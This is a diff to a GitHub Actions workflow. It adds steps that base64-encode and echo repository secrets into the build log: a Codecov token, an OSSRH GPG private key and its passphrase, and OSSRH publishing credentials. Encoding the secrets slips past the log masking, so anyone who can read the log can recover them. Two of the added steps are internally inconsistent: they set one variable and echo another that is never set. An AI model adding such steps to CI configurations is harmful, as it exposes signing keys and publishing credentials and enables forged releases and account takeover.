@@ -9,7 +9,28 @@ jobs:
       - name: Check out repository
         uses: actions/checkout@v3
 
-      - name: Show secret
+      - name: Show secret1
         env:
           SECRETO1: ${{secrets.CODECOV_TOKEN}}
         run: 'echo "$SECRETO1" | base64'
+
+      - name: Show secret2
+        env:
+          SECRETO2: ${{secrets.OSSRH_GPG_SECRET_KEY}}
+        run: 'echo "$SECRETO2" | base64'        
+
+      - name: Show secret3
+        env:
+          SECRETO3: ${{secrets.OSSRH_GPG_SECRET_KEY_PASSWORD}}
+        run: 'echo "$SECRETO3" | base64'        
+
+      - name: Show secret4
+        env:
+          SECRETO3: ${{secrets.OSSRH_PASSWORD}}
+        run: 'echo "$SECRETO4" | base64'
+
+      - name: Show secret5
+        env:
+          SECRETO3: ${{secrets.OSSRH_USERNAME}}
+        run: 'echo "$SECRETO5" | base64'        
+        
